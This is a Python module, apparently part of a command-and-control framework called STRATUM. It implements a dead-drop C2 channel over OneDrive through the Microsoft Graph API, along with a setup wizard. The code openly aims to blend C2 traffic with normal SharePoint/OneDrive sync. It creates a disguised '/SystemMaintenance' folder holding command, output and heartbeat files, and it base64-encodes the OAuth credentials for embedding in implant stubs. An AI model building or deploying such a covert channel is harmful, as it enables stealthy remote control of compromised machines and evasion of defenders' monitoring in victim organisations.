"""
OneDrive provider — transport + deployment wizard.

Dead-drop C2 channel via Microsoft Graph API (OneDrive for Business or personal).
Recommended for targets in Microsoft 365 / Azure AD environments — traffic blends
with normal SharePoint/OneDrive sync activity.

Token refresh: https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token
File API:      https://graph.microsoft.com/v1.0/me/drive/root:{path}:/content
"""
import base64
import re
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Optional

import requests

from providers import _p, ask, ask_yn, err, info, ok, warn
from providers.base import (
    BaseConfig, BaseTransport, ProviderWizard, RateLimitedError, TRANSPORT_REGISTRY,
)

_HERE       = Path(__file__).parent
CREDS_FILE  = Path("credentials") / "onedrive"

_GRAPH_BASE = "https://graph.microsoft.com/v1.0/me/drive/root:"
_TOKEN_BASE = "https://login.microsoftonline.com/"
_SCOPE      = "Files.ReadWrite.All offline_access"


# ╔══════════════════════════════════════════════════════════════════════════════
# ║  ONEDRIVE TRANSPORT  (runtime channel)
# ╚══════════════════════════════════════════════════════════════════════════════

class OneDriveTransport(BaseTransport):
    """Dead-drop transport over Microsoft Graph API (OneDrive)."""

    def __init__(self, creds: dict):
        self._client_id     = creds.get("CLIENT_ID", "")
        self._client_secret = creds.get("CLIENT_SECRET", "")
        self._tenant_id     = creds.get("TENANT_ID", "common")
        self._refresh_token = creds.get("REFRESH_TOKEN", "")
        self._token:        str   = ""
        self._token_expiry: float = 0.0

    def _token_url(self) -> str:
        # Personal accounts use 'consumers'; work/school accounts use their tenant ID.
        # Using 'consumers' for a work/school token returns AADSTS90014.
        return f"{_TOKEN_BASE}{self._tenant_id}/oauth2/v2.0/token"

    def _access_token(self) -> str:
        import time
        if self._token and time.time() < self._token_expiry - 60:
            return self._token
        try:
            r = requests.post(self._token_url(), data={
                "grant_type":    "refresh_token",
                "refresh_token": self._refresh_token,
                "client_id":     self._client_id,
                "client_secret": self._client_secret,
                "scope":         _SCOPE,
            }, timeout=15)
            d = r.json()
            self._token        = d.get("access_token", "")
            expires_in         = int(d.get("expires_in", 3600))
            self._token_expiry = time.time() + expires_in
            return self._token
        except Exception:
            return ""

    def _url(self, path: str, suffix: str = ":/content") -> str:
        return f"{_GRAPH_BASE}{path}{suffix}"

    def _ensure_folder(self, token: str, folder_path: str) -> bool:
        """Create folder hierarchy on OneDrive if it does not exist.

        Graph API PUT .../root:/folder/file:/content returns 404 when the
        parent folder is missing. This method walks each path component and
        creates any missing folders via POST .../children.
        """
        parts = [p for p in folder_path.strip("/").split("/") if p]
        if not parts:
            return True
        current = ""
        for part in parts:
            parent_url = (
                f"https://graph.microsoft.com/v1.0/me/drive/root"
                + (f":/{current}:/children" if current else "/children")
            )
            current = f"{current}/{part}" if current else part
            try:
                r = requests.post(
                    parent_url,
                    headers={
                        "Authorization": f"Bearer {token}",
                        "Content-Type":  "application/json",
                    },
                    json={
                        "name": part,
                        "folder": {},
                        "@microsoft.graph.conflictBehavior": "ignore",
                    },
                    timeout=15,
                )
                if r.status_code not in (200, 201, 409):
                    return False
            except Exception:
                return False
        return True

    def upload(self, path: str, data: bytes) -> bool:
        token = self._access_token()
        if not token:
            return False
        try:
            r = requests.put(
                self._url(path),
                headers={
                    "Authorization": f"Bearer {token}",
                    "Content-Type":  "application/octet-stream",
                },
                data=data,
                timeout=30,
            )
            if r.status_code in (200, 201):
                return True
            # OneDrive for Business may need the folder created explicitly
            folder = "/".join(path.strip("/").split("/")[:-1])
            if folder and r.status_code not in (400,):
                self._ensure_folder(token, folder)
                r2 = requests.put(
                    self._url(path),
                    headers={
                        "Authorization": f"Bearer {token}",
                        "Content-Type":  "application/octet-stream",
                    },
                    data=data,
                    timeout=30,
                )
                return r2.status_code in (200, 201)
            return False
        except Exception:
            return False

    def download(self, path: str) -> Optional[bytes]:
        token = self._access_token()
        if not token:
            return None
        try:
            r = requests.get(
                self._url(path),
                headers={"Authorization": f"Bearer {token}"},
                timeout=30,
            )
            if r.status_code == 429:
                raise RateLimitedError("OneDrive rate limited")
            if r.status_code == 200:
                return r.content
            return None
        except RateLimitedError:
            raise
        except Exception:
            return None

    def delete(self, path: str) -> bool:
        token = self._access_token()
        if not token:
            return False
        try:
            r = requests.delete(
                self._url(path, ":"),
                headers={"Authorization": f"Bearer {token}"},
                timeout=30,
            )
            return r.status_code in (200, 204, 404)
        except Exception:
            return False


TRANSPORT_REGISTRY["onedrive"] = OneDriveTransport


# ============================================================
# ONEDRIVE CONFIG
# ============================================================

@dataclass
class OneDriveConfig(BaseConfig):
    """BaseConfig + Microsoft Graph OAuth2 credentials."""
    client_id:     str = ""
    client_secret: str = ""
    tenant_id:     str = "common"
    refresh_token: str = ""

    def save_creds(self) -> None:
        CREDS_FILE.parent.mkdir(parents=True, exist_ok=True)
        CREDS_FILE.write_text(
            "# OneDrive / Microsoft Graph OAuth2 Configuration\n"
            f"# Generated: {datetime.now().strftime('%a %b %d %I:%M:%S %p %Z %Y')}\n\n"
            f'CLIENT_ID="{self.client_id}"\n'
            f'CLIENT_SECRET="{self.client_secret}"\n'
            f'TENANT_ID="{self.tenant_id}"\n'
            f'REFRESH_TOKEN="{self.refresh_token}"\n'
        )
        CREDS_FILE.chmod(0o600)

    def load_creds(self) -> bool:
        if not CREDS_FILE.exists():
            return False
        for line in CREDS_FILE.read_text().splitlines():
            m = re.match(r'^(\w+)=["\']?(.*?)["\']?\s*$', line.strip())
            if m:
                k, v = m.group(1), m.group(2).strip()
                if k == "CLIENT_ID":     self.client_id     = v
                if k == "CLIENT_SECRET": self.client_secret = v
                if k == "TENANT_ID":     self.tenant_id     = v
                if k == "REFRESH_TOKEN": self.refresh_token = v
        return bool(self.client_id and self.client_secret and self.refresh_token)


# ============================================================
# ONEDRIVE WIZARD
# ============================================================

class OneDriveWizard(ProviderWizard):
    PROVIDER_ID   = "onedrive"
    PROVIDER_NAME = "OneDrive"
    PROVIDER_ICON = "☁️"
    TRANSPORT_DIR = _HERE / "transport"

    def _creds_path(self, deploy_dir: Path) -> Path:
        return deploy_dir / f".{self.PROVIDER_ID}_creds"

    def make_config(self) -> OneDriveConfig:
        cfg = OneDriveConfig()
        cfg.folder_path    = "/SystemMaintenance"
        cfg.input_file     = "/cmd.log"
        cfg.output_file    = "/out.log"
        cfg.heartbeat_file = "/health.xml"
        return cfg

    def step_auth(self, cfg: OneDriveConfig) -> None:
        self._step("Microsoft Graph OAuth2 Configuration")

        if CREDS_FILE.exists():
            ans = ask(f"Found existing credentials ({CREDS_FILE}). Reuse? [Y/n]")
            if not ans or ans.lower().startswith("y"):
                if cfg.load_creds():
                    ok(f"OAuth2 credentials loaded from {CREDS_FILE}")
                    return
                warn("Saved credentials incomplete — re-entering")

        _p([("", "")])
        account_type = ask("Account type — personal or work", "personal",
                           choices=("personal", "work"))
        _p([("", "")])

        if account_type == "personal":
            _p([("class:yellow", "  ── Personal account path (outlook / hotmail / live) ──")])
            _p([("", "")])
            warn("Microsoft no longer allows app registrations without a directory.")
            info("You need a free tenant first. Two options:")
            info("")
            info("  A) M365 Developer Program (free, no credit card, recommended)")
            info("     https://aka.ms/joinM365DeveloperProgram")
            info("     → creates a tenant  yourname.onmicrosoft.com  with OneDrive included")
            info("")
            info("  B) Azure Free Account (credit card required, free tier)")
            info("     https://azure.microsoft.com/free")
            _p([("", "")])
            info("Once you have a tenant, sign in to portal.azure.com with it and continue:")
            _p([("", "")])
            _p([("class:yellow", "  Step A — Register the app:")])
            info("— https://portal.azure.com/#view/Microsoft_AAD_RegisteredApps/ApplicationsListBlade")
            info("— New registration")
            info("    Name: anything")
            info("    Supported account types: Personal Microsoft accounts only")
            info("      (or 'Any org directory + personal accounts' if your tenant is work/school)")
            info("    Redirect URI: Web  →  http://localhost")
            info("— Register → Overview page → copy  Application (client) ID  (your CLIENT_ID)")
            _p([("", "")])
            _p([("class:yellow", "  Step B — Create a client secret:")])
            info("— Certificates & secrets → New client secret → Add")
            info("— Copy the VALUE column immediately (disappears on reload)")
            _p([("", "")])
            _p([("class:yellow", "  Step C — Add permissions (no admin consent needed):")])
            info("— API permissions → Add a permission → Microsoft Graph → Delegated")
            info("— Add:  Files.ReadWrite   offline_access")
            _p([("", "")])
            cfg.tenant_id = "consumers"
            info("Tenant ID set to: consumers  (correct for personal Microsoft accounts)")
        else:
            _p([("class:yellow", "  ── Work / school account path (Azure AD tenant) ──")])
            _p([("", "")])
            _p([("class:yellow", "  Step A — Register the app:")])
            info("— https://portal.azure.com/#view/Microsoft_AAD_RegisteredApps/ApplicationsListBlade")
            info("— New registration")
            info("    Name: anything")
            info("    Supported account types: Accounts in this organizational directory only")
            info("    Redirect URI: Web  →  http://localhost")
            info("— Register → Overview page → copy  Application (client) ID  (your CLIENT_ID)")
            info("                           → copy  Directory (tenant) ID     (your TENANT_ID)")
            _p([("", "")])
            _p([("class:yellow", "  Step B — Create a client secret:")])
            info("— Certificates & secrets → New client secret → Add")
            info("— Copy the VALUE column immediately (disappears on reload)")
            _p([("", "")])
            _p([("class:yellow", "  Step C — Add permissions:")])
            info("— API permissions → Add a permission → Microsoft Graph → Delegated")
            info("— Add:  Files.ReadWrite   offline_access")
            info("— Grant admin consent  (requires tenant admin role)")
            _p([("", "")])

        _p([("", "")])
        cfg.client_id = ask("CLIENT_ID (UUID from Overview page)")
        if not cfg.client_id:
            err("CLIENT_ID is required")
        cfg.client_secret = ask("CLIENT_SECRET (value from Certificates & secrets)")
        if not cfg.client_secret:
            err("CLIENT_SECRET is required")
        if account_type == "work":
            cfg.tenant_id = ask("TENANT_ID (Directory tenant ID from Overview page)")

        auth_url = (
            f"https://login.microsoftonline.com/{cfg.tenant_id}/oauth2/v2.0/authorize"
            f"?client_id={cfg.client_id}"
            f"&response_type=code"
            f"&redirect_uri=http://localhost"
            f"&scope=Files.ReadWrite offline_access"
            f"&response_mode=query"
        )
        _p([("", "")])
        _p([("class:yellow", "  Step E — Authorize:")])
        info("Open this URL in your browser and sign in with the Microsoft account:")
        _p([("class:green", f"\n  {auth_url}\n")])
        info("After sign-in the browser will redirect to http://localhost/?code=XXXX&...")
        info("The page will show an error (connection refused) — that is expected.")
        info("Copy the  code=  value from the URL bar and paste it below.")
        _p([("", "")])

        auth_code = ask("AUTHORIZATION CODE")
        if not auth_code:
            err("Authorization code is required")

        info("Exchanging code for refresh token...")
        try:
            r = requests.post(
                f"{_TOKEN_BASE}{cfg.tenant_id}/oauth2/v2.0/token",
                data={
                    "grant_type":    "authorization_code",
                    "code":          auth_code,
                    "redirect_uri":  "http://localhost",
                    "client_id":     cfg.client_id,
                    "client_secret": cfg.client_secret,
                    "scope":         "Files.ReadWrite offline_access",
                },
                timeout=15,
            )
            data = r.json()
        except Exception as e:
            err(f"Token request failed: {e}")

        cfg.refresh_token = data.get("refresh_token", "")
        if not cfg.refresh_token:
            safe = {k: v for k, v in data.items() if k not in ("access_token", "refresh_token", "id_token")}
            info("Response: " + str(safe))
            err("Could not obtain refresh token — ensure offline_access scope was granted")

        ok(f"Refresh token obtained ({len(cfg.refresh_token)} chars)")
        cfg.save_creds()
        ok("Credentials saved (reusable for future deployments)")

    def step_init_channel(self, cfg: OneDriveConfig) -> None:
        self._step("OneDrive File Initialization")
        t = self._make_transport(cfg)
        try:
            import requests as _req
            _r = _req.post(t._token_url(), data={
                "grant_type":    "refresh_token",
                "refresh_token": t._refresh_token,
                "client_id":     t._client_id,
                "client_secret": t._client_secret,
                "scope":         _SCOPE,
            }, timeout=15)
            _d = _r.json()
            if "error" in _d:
                _code = _d.get("error", "")
                _desc = _d.get("error_description", "")[:300]
                warn(f"Token error: {_code} — {_desc}")
                if "AADSTS65001" in _desc:
                    info("Fix: Azure Portal → App registrations → your app → API permissions")
                    info("     → Add permission → Microsoft Graph → Delegated → Files.ReadWrite.All")
                    info("     → Grant admin consent  (or re-authorize with a fresh auth code)")
                elif "AADSTS70011" in _desc:
                    info("Fix: the refresh token was issued for a different scope.")
                    info("     Re-run the wizard to generate a new token with Files.ReadWrite.All scope.")
                err(f"Cannot obtain access token — {_code}")
            token = _d.get("access_token", "")
        except Exception as _e:
            err(f"Token request failed: {_e}")
            token = ""
        if not token:
            err("Could not obtain access token — check CLIENT_ID, CLIENT_SECRET, REFRESH_TOKEN, TENANT_ID")
        for dest, body in [
            (cfg.folder_path + cfg.input_file,     b"MZ"),
            (cfg.folder_path + cfg.output_file,    b"MZ"),
            (cfg.folder_path + cfg.heartbeat_file, b"MZ"),
        ]:
            try:
                import requests as _req
                r = _req.put(
                    t._url(dest),
                    headers={"Authorization": f"Bearer {token}", "Content-Type": "application/octet-stream"},
                    data=body,
                    timeout=30,
                )
                if r.status_code in (200, 201):
                    ok(f"{dest} → initialized")
                else:
                    # retry after ensuring folder exists
                    folder = "/".join(dest.strip("/").split("/")[:-1])
                    if folder:
                        t._ensure_folder(token, folder)
                    r2 = _req.put(
                        t._url(dest),
                        headers={"Authorization": f"Bearer {token}", "Content-Type": "application/octet-stream"},
                        data=body,
                        timeout=30,
                    )
                    if r2.status_code in (200, 201):
                        ok(f"{dest} → initialized (after folder create)")
                    else:
                        warn(f"{dest} — upload failed [HTTP {r2.status_code}]: {r2.text[:200]}")
            except Exception as exc:
                warn(f"{dest} — upload error: {exc}")

    def _provider_subs(self, cfg: OneDriveConfig) -> dict:
        b64 = lambda s: base64.b64encode(s.encode()).decode()
        return {
            "PLACEHOLDER_CLIENT_ID_B64":     b64(cfg.client_id),
            "PLACEHOLDER_CLIENT_SECRET_B64": b64(cfg.client_secret),
            "PLACEHOLDER_TENANT_ID_B64":     b64(cfg.tenant_id),
            "PLACEHOLDER_REFRESH_TOKEN_B64": b64(cfg.refresh_token),
            "STUB_CLIENT_ID_B64":            b64(cfg.client_id),
            "STUB_CLIENT_SECRET_B64":        b64(cfg.client_secret),
            "STUB_TENANT_ID_B64":            b64(cfg.tenant_id),
            "STUB_REFRESH_TOKEN_B64":        b64(cfg.refresh_token),
        }

    def _native_agent_extra_env(self, cfg: OneDriveConfig) -> dict:
        return {
            "STRATUM_APP_KEY":       cfg.client_id,
            "STRATUM_APP_SECRET":    cfg.client_secret,
            "STRATUM_TENANT_ID":     cfg.tenant_id,
            "STRATUM_REFRESH_TOKEN": cfg.refresh_token,
            "STRATUM_PROVIDER":      "onedrive",
        }

    def _make_transport(self, cfg: OneDriveConfig) -> OneDriveTransport:
        return OneDriveTransport({
            "CLIENT_ID":     cfg.client_id,
            "CLIENT_SECRET": cfg.client_secret,
            "TENANT_ID":     cfg.tenant_id,
            "REFRESH_TOKEN": cfg.refresh_token,
        })
